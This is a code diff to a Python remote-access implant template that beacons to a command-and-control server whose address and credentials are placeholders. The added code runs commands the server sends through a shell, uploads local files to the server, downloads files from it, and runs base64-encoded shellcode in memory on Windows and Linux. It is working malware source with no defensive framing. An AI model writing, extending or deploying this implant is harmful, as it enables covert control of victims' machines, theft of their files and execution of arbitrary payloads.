@@ -5,26 +5,126 @@ import requests
 import subprocess
 import time
 import json
+import os
+import base64
+import ctypes
+import sys
+import mmap
+from ctypes.util import find_library
+
 C2_URL = 'http://{lhost}:{lport}'
-CLIENT_ID = '{line}'  
+CLIENT_ID = '{line}'
+USERNAME = '{username}'
+PASSWORD = '{password}'
+
+def send_request(url, method='GET', body=None, username=USERNAME, password=PASSWORD):
+    headers = {
+        'Authorization': 'Basic ' + base64.b64encode(f"{username}:{password}".encode('ascii')).decode('ascii')
+    }
+
+    if method == 'POST':
+        headers['Content-Type'] = 'application/json'
+
+    try:
+        if method == 'GET':
+            response = requests.get(url, headers=headers)
+        elif method == 'POST':
+            response = requests.post(url, headers=headers, data=body)
+        else:
+            raise ValueError(f"Unsupported HTTP method: {method}")
+        response.raise_for_status()
+        return response
+    except requests.RequestException as e:
+        print(f"[!] Error in send_request: {e}")
+        return None
+
+def escn(shellcode):
+    try:
+        sc_bytes = base64.b64decode(shellcode)
+        print(f"[DEBUG] Python version: {sys.version}")
+        print(f"[DEBUG] System architecture: {sys.platform}")
+        print(f"[DEBUG] Shellcode length: {len(sc_bytes)}")
+        print(f"[DEBUG] First 20 bytes: {sc_bytes[:20].hex()}")
+
+        if os.name == 'nt':
+            cbuf = (ctypes.c_char * len(sc_bytes)).from_buffer_copy(sc_bytes)
+            ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
+            ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_long(0), ctypes.c_long(len(sc_bytes)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
+            ctypes.windll.kernel32.RtlMoveMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_int]
+            ctypes.windll.kernel32.RtlMoveMemory(ptr, cbuf, ctypes.c_int(len(sc_bytes)))
+            print(f"[DEBUG] Allocated memory at: {ptr}")
+            ctypes.CFUNCTYPE(ctypes.c_int)(ptr)()
+        else:
+            libc = ctypes.CDLL(find_library('c'))
+            mem_size = len(sc_bytes)
+            mem = libc.mmap(
+                None,
+                mem_size,
+                mmap.PROT_READ | mmap.PROT_WRITE,
+                mmap.MAP_ANONYMOUS | mmap.MAP_PRIVATE,
+                -1,
+                0
+            )
+            if mem == -1:
+                raise OSError("mmap failed")
+            mem_ptr = ctypes.c_void_p(mem)
+            print(f"[DEBUG] Allocated memory at: {mem_ptr}")
+            ctypes.memmove(mem_ptr, sc_bytes, mem_size)
+            libc.mprotect(mem_ptr, mem_size, mmap.PROT_READ | mmap.PROT_EXEC)
+            print(f"[DEBUG] Changed memory protection to PROT_READ | PROT_EXEC")
+            shell_func = ctypes.CFUNCTYPE(None)(mem_ptr)
+            shell_func()
+
+    except Exception as e:
+        print(f"[!] Shellcode execution error: {e}")
+        import traceback
+        traceback.print_exc()
+
 while True:
     try:
-        response = requests.get(f'{C2_URL}/command/{CLIENT_ID}')
-        if response.status_code == 200:
+        response = send_request(f'{C2_URL}/command/{CLIENT_ID}')
+        if response:
             command = response.text
             if 'terminate' in command:
                 break
             elif command.startswith('sc:'):
                 sc = command.replace('sc:', '')
-                sc_bytes = bytes.fromhex(sc)
-                ctypes.CDLL(ctypes.create_string_buffer(sc_bytes, len(shellcode_bytes)))
+                try:
+                    escn(sc)
+                except Exception as e:
+                    print(f"[!] Shellcode execution failed: {e}")
+            elif command.startswith('download:'):
+                file_path = command.replace('download:', '')
+                file_url = f'{C2_URL}/download/{file_path}'
+                file_name = os.path.basename(file_path)
+                response = send_request(file_url)
+                if response:
+                    with open(file_name, 'wb') as f:
+                        f.write(response.content)
+                    print(f'[INFO] File downloaded: {file_name}')
+                else:
+                    print(f'[ERROR] File download failed: {file_name}')
+            elif command.startswith('upload:'):
+                file_path = command.replace('upload:', '')
+                try:
+                    with open(file_path, 'rb') as f:
+                        files = {'file': f}
+                        headers = {
+                            'Authorization': 'Basic ' + base64.b64encode(f"{USERNAME}:{PASSWORD}".encode('ascii')).decode('ascii')
+                        }
+                        response = requests.post(f'{C2_URL}/upload', headers=headers, files=files)
+                        if response.status_code == 200:
+                            print(f'[INFO] File uploaded: {file_path}')
+                        else:
+                            print(f'[ERROR] File upload failed: {file_path} {C2_URL}/upload {USERNAME}:{PASSWORD}')
+                except Exception as e:
+                    print(f'[!] Error uploading file: {e}')
             else:
                 CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 output = CMD.stdout.read() + CMD.stderr.read()
                 output_str = output.decode('utf-8', errors='replace')
-                json_data = json.dumps({'output': output_str})
-                headers = {'Content-Type': 'application/json'}
-                requests.post(f'{C2_URL}/command/{CLIENT_ID}', data=json_data, headers=headers)
+                json_data = json.dumps({'output': output_str, 'client': 'Linux', 'command': command})
+                send_request(f'{C2_URL}/command/{CLIENT_ID}', method='POST', body=json_data)
         time.sleep(5)
     except Exception as e:
         print(f'[!] Error: {e}')
